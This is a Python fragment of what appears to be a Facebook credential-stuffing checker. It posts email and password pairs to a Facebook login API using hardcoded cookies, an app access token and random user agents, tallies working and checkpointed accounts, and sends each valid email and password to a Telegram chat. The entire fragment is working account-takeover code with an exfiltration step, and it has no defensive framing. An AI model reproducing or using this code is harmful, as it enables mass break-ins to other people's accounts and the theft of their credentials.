	cookies = {
    'datr': 'UQ-Baol52a5iz2RvO3vKbOMn',
    'sb': 'UQ-BatRDIIUWbsYhLEvoC2KA',
    'ps_l': '1',
    'ps_n': '1',
    'dpr': '2.260737895965576',
    'fr': '0A2NRtmGZw7LS3UJp.AWc4IMQsbVWrIkBKeFSIrTEqBhWCPxN4qYoyheYf40zEvSrwt4c.BqgQ9R..AAA.0.0.BqmQ7D.AWcrhCHEqnR7D9CsEqyfB77wafU',
    'wd': '891x1737',
}
	url = 'https://api.facebook.com/method/auth.login'
	headers={'user-agent': generate_user_agent()}
	
	data = {'email':em,  'password':pas, 'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'format':'JSON'}
	
	response = requests.post(url, headers=headers, data=data,cookies=cookies,timeout=5).text


	if 'session_key' in response:
		OK += 1
		Total += 1
		f1 = f" email = {em} "
		f2 = f" password = {pas}"
		g = f"{f1}\n{f2}"
		send_telegram(g)
		print(
		f"\r{G}  Cheked : [{Total}] {M}==> {R} CP [{CP}] {M}==> {L} OK : [{OK}] ",end="")
	else:
		Total += 1
		CP += 1
		print(
		f"\r{G}  Cheked : [{Total}] {M}==> {R} CP [{CP}] {M}==> {L} OK : [{OK}] ",end="")
